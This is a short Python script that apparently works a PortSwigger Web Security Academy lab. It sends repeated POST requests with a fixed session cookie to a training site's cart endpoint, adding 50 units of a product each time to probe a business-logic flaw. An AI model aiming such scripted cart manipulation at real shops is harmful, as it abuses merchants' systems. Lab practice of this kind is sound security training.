import requests

url = "https://0a5c00d90467a1a6811a5cca00be0063.web-security-academy.net/cart"  # Replace with your target URL
cookie = {"session": "liiMTh4p1Tr8YYlrmIyVvzHXe0sHikqr"}  # Replace with your cookie
params = {"productId": "1", "redir": "PRODUCT", "quantity":"50"}  # Replace with your parameters

for _ in range(10):
    response = requests.post(url, cookies=cookie, data=params)
    if _ % 20 == 0:
        print(f"Sent {_} requests")